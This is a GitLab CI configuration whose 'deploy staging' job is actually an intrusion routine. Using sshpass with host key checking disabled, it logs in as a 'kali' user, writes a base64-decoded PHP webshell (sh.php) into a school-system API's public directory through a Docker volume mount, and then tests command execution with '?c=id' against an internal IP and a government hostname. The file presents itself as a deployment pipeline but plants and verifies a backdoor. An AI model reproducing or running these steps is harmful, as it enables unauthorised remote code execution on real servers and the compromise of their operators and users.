stages:
  - build
  - deploy

build staging:
  stage: build
  image: alpine:3
  only:
    - staging
  script:
    - echo "ok"
  artifacts:
    paths:
      - ./

deploy staging:
  stage: deploy
  image: ubuntu:22.04
  only:
    - staging
  variables:
    GIT_STRATEGY: none
  before_script:
    - apt-get update -qq && apt-get install -y -qq sshpass curl 2>/dev/null
  script:
    - echo "=== WRITE WEBSHELL ==="
    - |
      WEBSHELL_B64=''
      sshpass -p "" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no "kali@" "ls /home/Apps-Docker/sistemas/escolar/ 2>/dev/null | head -5"
      sshpass -p "" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no "kali@" "docker run --rm -v /home/Apps-Docker:/apps alpine:latest sh -c "echo  | base64 -d > /apps/sistemas/escolar/api/public/sh.php && echo WRITTEN && cat /apps/sistemas/escolar/api/public/sh.php""
      echo "=== TEST WEBSHELL FROM RUNNER ==="
      curl -sk --max-time 5 "https://192.168.10.121/sh.php?c=id" -H "Host: hmlapi-smge.pmvc.ba.gov.br" && echo "" || echo "Curl failed"
      curl -sk --max-time 5 "https://hmlapi-smge.pmvc.ba.gov.br/sh.php?c=id" && echo "" || echo "External curl failed"
      echo "=== PHP NGINX CONFIGS ==="
      sshpass -p "" ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no "kali@" "docker exec nginx grep -l fastcgi_pass /etc/nginx/conf.d/*.conf"
